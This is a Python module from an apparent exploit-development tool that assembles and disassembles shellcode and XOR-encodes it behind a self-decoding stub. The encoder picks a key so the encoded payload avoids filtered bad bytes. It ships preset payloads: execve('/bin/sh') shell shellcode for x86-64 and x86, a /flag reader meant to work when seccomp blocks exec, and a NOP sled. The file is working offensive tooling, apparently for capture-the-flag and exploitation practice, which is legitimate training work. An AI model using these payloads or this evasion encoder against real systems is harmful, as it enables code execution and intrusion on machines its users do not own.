# 80PWNER — by Anas Mahfouz (The 80)
# Copyright (c) 2026 Anas Mahfouz (The 80). MIT License.

"""Shellcode assembler / disassembler / encoder (Payload Studio core).

Keystone assembles, Capstone disassembles, and a two-pass XOR stub builder
turns arbitrary shellcode into a bad-byte-free, self-decoding payload — the
three things you otherwise bounce between nasm, xxd and a scratch script for.
Pure engine: no Qt.
"""

from __future__ import annotations

import base64
import re
from dataclasses import dataclass

try:
    import keystone

    _HAS_KEYSTONE = True
except ImportError:  # pragma: no cover — declared dependency
    keystone = None
    _HAS_KEYSTONE = False

try:
    import capstone

    _HAS_CAPSTONE = True
except ImportError:  # pragma: no cover
    capstone = None
    _HAS_CAPSTONE = False


class ShellcodeError(ValueError):
    """User-facing assembler/encoder failure."""


# name -> (keystone arch, keystone mode, capstone arch, capstone mode, bits)
ARCH_TABLE: dict[str, tuple[int, int, int, int, int]] = {}

if _HAS_KEYSTONE and _HAS_CAPSTONE:
    _CA_ARM64 = getattr(capstone, "CS_ARCH_AARCH64", capstone.CS_ARCH_ARM64)
    ARCH_TABLE = {
        "x86_64": (
            keystone.KS_ARCH_X86, keystone.KS_MODE_64,
            capstone.CS_ARCH_X86, capstone.CS_MODE_64, 64,
        ),
        "x86": (
            keystone.KS_ARCH_X86, keystone.KS_MODE_32,
            capstone.CS_ARCH_X86, capstone.CS_MODE_32, 32,
        ),
        "arm": (
            keystone.KS_ARCH_ARM, keystone.KS_MODE_ARM,
            capstone.CS_ARCH_ARM, capstone.CS_MODE_ARM, 32,
        ),
        "aarch64": (
            keystone.KS_ARCH_ARM64, 0,
            _CA_ARM64, 0, 64,
        ),
        "mips": (
            keystone.KS_ARCH_MIPS, keystone.KS_MODE_MIPS32,
            capstone.CS_ARCH_MIPS, capstone.CS_MODE_MIPS32, 32,
        ),
        "mips64": (
            keystone.KS_ARCH_MIPS, keystone.KS_MODE_MIPS64,
            capstone.CS_ARCH_MIPS, capstone.CS_MODE_MIPS64, 64,
        ),
        "ppc64": (
            keystone.KS_ARCH_PPC, keystone.KS_MODE_PPC64,
            capstone.CS_ARCH_PPC, capstone.CS_MODE_64, 64,
        ),
        "sparc": (
            keystone.KS_ARCH_SPARC, keystone.KS_MODE_SPARC32,
            capstone.CS_ARCH_SPARC, capstone.CS_MODE_32, 32,
        ),
    }

ARCHES: tuple[str, ...] = tuple(ARCH_TABLE) or ("x86_64",)


def _spec(arch: str, big_endian: bool = False) -> tuple[int, int, int, int, int]:
    key = arch.lower()
    if not ARCH_TABLE:
        raise _engine_error("keystone-engine" if not _HAS_KEYSTONE else "capstone")
    if key not in ARCH_TABLE:
        raise ShellcodeError(
            f"Unsupported architecture {arch!r} — choose from {', '.join(ARCHES)}."
        )
    ks_arch, ks_mode, ca_arch, ca_mode, bits = ARCH_TABLE[key]
    if big_endian:
        ks_mode |= keystone.KS_MODE_BIG_ENDIAN
        ca_mode |= capstone.CS_MODE_BIG_ENDIAN
    else:
        ks_mode |= keystone.KS_MODE_LITTLE_ENDIAN
        ca_mode |= capstone.CS_MODE_LITTLE_ENDIAN
    return ks_arch, ks_mode, ca_arch, ca_mode, bits


def _engine_error(name: str) -> ShellcodeError:
    """Actionable error when a native engine is present but unusable.

    On macOS arm64 the published keystone-engine wheel is a stub without the
    native library, so ``pip install keystone-engine`` succeeds while the
    import (and every assembly call) fails. Say that plainly instead of
    claiming the package is missing.
    """
    return ShellcodeError(
        f"{name} is unavailable: the Python package is installed but its native "
        "library did not load (macOS arm64 ships a stub keystone wheel) — "
        "this feature is disabled on this platform"
    )


def assembler_available() -> bool:
    """True when both native engines loaded, so assembly/disassembly work."""
    return bool(ARCH_TABLE)


def assemble(code: str, arch: str = "x86_64", big_endian: bool = False) -> bytes:
    """Assemble *code* (Intel/AT&T per architecture) into raw bytes."""
    if not _HAS_KEYSTONE:
        raise _engine_error("keystone-engine")
    ks_arch, ks_mode, _ca, _cm, _bits = _spec(arch, big_endian)
    try:
        engine = keystone.Ks(ks_arch, ks_mode)
        encoded, _count = engine.asm(code, 0)
    except keystone.KsError as exc:
        raise ShellcodeError(str(exc)) from exc
    if not encoded:
        raise ShellcodeError("Assembler produced no bytes.")
    return bytes(encoded)


@dataclass(frozen=True)
class DisasmRow:
    address: int
    bytes_hex: str
    text: str


def disassemble(
    data: bytes,
    arch: str = "x86_64",
    big_endian: bool = False,
    address: int = 0,
) -> list[DisasmRow]:
    """Capstone disassembly rows for raw bytes."""
    if not _HAS_CAPSTONE:
        raise _engine_error("capstone")
    _ks_arch, _ks_mode, ca_arch, ca_mode, _bits = _spec(arch, big_endian)
    engine = capstone.Cs(ca_arch, ca_mode)
    rows: list[DisasmRow] = []
    for insn in engine.disasm(data, address):
        rows.append(
            DisasmRow(
                address=insn.address,
                bytes_hex=" ".join(f"{b:02x}" for b in insn.bytes),
                text=f"{insn.mnemonic} {insn.op_str}".strip(),
            )
        )
    return rows


def parse_hex_bytes(text: str) -> bytes:
    """``'90 90 c3'`` / ``'\\x90\\x90'`` / ``'0x9090'`` → bytes."""
    cleaned = text.strip()
    if not cleaned:
        return b""
    if "\\x" in cleaned:
        cleaned = cleaned.replace("\\x", " ")
    cleaned = re.sub(r"0x", " ", cleaned, flags=re.I)
    cleaned = re.sub(r"[\s,;:_-]+", "", cleaned)
    if not cleaned:
        return b""
    if len(cleaned) % 2 or not re.fullmatch(r"[0-9a-fA-F]+", cleaned):
        raise ShellcodeError("Hex bytes must be even-length hex pairs (e.g. 90 90 c3).")
    return bytes.fromhex(cleaned)


def format_bytes(data: bytes, style: str = "python") -> str:
    """Render payload bytes for the place you are about to paste them."""
    style = style.lower()
    if style == "python":
        return 'b"' + "".join(f"\\x{b:02x}" for b in data) + '"'
    if style == "escaped":
        return "".join(f"\\x{b:02x}" for b in data)
    if style == "hex":
        return data.hex()
    if style == "c":
        return "{" + ", ".join(f"0x{b:02x}" for b in data) + "}"
    if style == "c_string":
        return '"' + "".join(f"\\x{b:02x}" for b in data) + '"'
    if style == "base64":
        return base64.b64encode(data).decode("ascii")
    raise ShellcodeError(f"Unknown output style {style!r}.")


def bad_byte_offsets(data: bytes, bad: bytes) -> list[int]:
    """Offsets where a forbidden byte appears."""
    return [index for index, value in enumerate(data) if value in bad]


def contains_bad(data: bytes, bad: bytes) -> bool:
    return any(value in bad for value in data)


def xor_bytes(data: bytes, key: int) -> bytes:
    if not 0 < key < 256:
        raise ShellcodeError("XOR key must be 1..255.")
    return bytes(value ^ key for value in data)


@dataclass(frozen=True)
class EncodedPayload:
    original: bytes
    encoded: bytes
    key: int
    stub: bytes
    payload: bytes  # stub + encoded, ready to send
    decoder_asm: str
    note: str = ""


_DECODER_TEMPLATE = """\
    jmp call_decoder
decoder:
    pop rsi
    xor ecx, ecx
    {length_asm}
loop_decoder:
    xor byte ptr [rsi + rcx - 1], {key}
    loop loop_decoder
    jmp payload
call_decoder:
    call decoder
payload:
"""


def build_xor_stub(data: bytes, key: int, arch: str = "x86_64") -> tuple[bytes, str]:
    """Two-pass call/pop decoder stub for x86-64 (SysV, position independent).

    Layout: ``jmp short call_decoder`` → ``call decoder`` pushes the address of
    the encoded blob → the decoder XORs it in place with *key* → jumps into the
    now-decoded payload.
    """
    if arch.lower() != "x86_64":
        raise ShellcodeError("The built-in XOR stub is x86-64 only — assemble your own decoder.")
    if not data:
        raise ShellcodeError("Nothing to encode.")
    if len(data) > 0xFFFF:
        raise ShellcodeError("Payload too large for the 16-bit counter stub (max 65535 bytes).")
    # ``mov cl, len`` keeps the stub free of the NUL bytes ``mov ecx, len``
    # would introduce (its 32-bit immediate is mostly zeros). Longer payloads
    # need the 16-bit form.
    length_asm = f"mov cl, {len(data)}" if len(data) <= 0xFF else f"mov cx, {len(data)}"
    asm_text = _DECODER_TEMPLATE.format(length_asm=length_asm, key=key)
    stub = assemble(asm_text, "x86_64")
    return stub, asm_text


def best_xor_key(data: bytes, bad: bytes) -> int | None:
    """Smallest key whose encoded bytes and key itself avoid *bad*."""
    for key in range(1, 256):
        if key in bad:
            continue
        if not contains_bad(xor_bytes(data, key), bad):
            return key
    return None


def encode_xor(
    data: bytes,
    bad: bytes = b"",
    key: int | None = None,
    arch: str = "x86_64",
) -> EncodedPayload:
    """XOR-encode *data* and prepend a self-decoding stub.

    With no explicit *key*, the smallest key that keeps both the encoded blob
    and the key itself free of *bad* bytes is chosen.
    """
    if not bad and key is None:
        key = 0x41
    if key is None:
        key = best_xor_key(data, bad)
        if key is None:
            raise EncodedPayloadError(
                "No XOR key avoids all bad bytes for this payload — shrink it or "
                "switch to an ADD/SUB encoder."
            )
    if key in bad:
        raise ShellcodeError(f"Key {key:#x} is itself a bad byte.")
    encoded = xor_bytes(data, key)
    if bad and contains_bad(encoded, bad):
        raise ShellcodeError(
            f"Key {key:#x} still produces bad bytes at offsets "
            f"{bad_byte_offsets(encoded, bad)[:8]} — try another key."
        )
    stub, asm_text = build_xor_stub(encoded, key, arch)
    return EncodedPayload(
        original=data,
        encoded=encoded,
        key=key,
        stub=stub,
        payload=stub + encoded,
        decoder_asm=asm_text,
    )


class EncodedPayloadError(ShellcodeError):
    """No encoding satisfies the constraints."""


@dataclass(frozen=True)
class Preset:
    name: str
    arch: str
    description: str
    asm: str


PRESETS: tuple[Preset, ...] = (
    Preset(
        "execve /bin/sh — x86-64",
        "x86_64",
        "Classic 27-byte-ish execve(\"/bin/sh\", NULL, NULL), no null-free tricks.",
        """\
xor rsi, rsi
push rsi
mov rdi, 0x68732f6e69622f
push rdi
mov rdi, rsp
xor rdx, rdx
push 59
pop rax
syscall
""",
    ),
    Preset(
        "execve /bin/sh — x86 (int 0x80)",
        "x86",
        "32-bit execve shell; uses the stack for the string.",
        """\
xor eax, eax
push eax
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
xor ecx, ecx
xor edx, edx
mov al, 11
int 0x80
""",
    ),
    Preset(
        "read /flag and write stdout — x86-64",
        "x86_64",
        "open(\"/flag\") + read + write, no execve — useful when seccomp blocks exec.",
        """\
xor eax, eax
push rax
mov rbx, 0x67616c662f
push rbx
mov rdi, rsp
xor esi, esi
mov al, 2
syscall
mov rdi, rax
sub rsp, 0x100
mov rsi, rsp
mov edx, 0x100
xor eax, eax
syscall
mov edx, eax
mov edi, 1
mov al, 1
syscall
""",
    ),
    Preset(
        "exit(0) — x86-64",
        "x86_64",
        "Tiny 8-byte exit for payload trampolines and tests.",
        """\
xor edi, edi
mov al, 60
syscall
""",
    ),
    Preset(
        "NOP sled — x86-64",
        "x86_64",
        "64-byte NOP sled; assemble it first when you need a landing pad.",
        "nop\n" * 64,
    ),
)
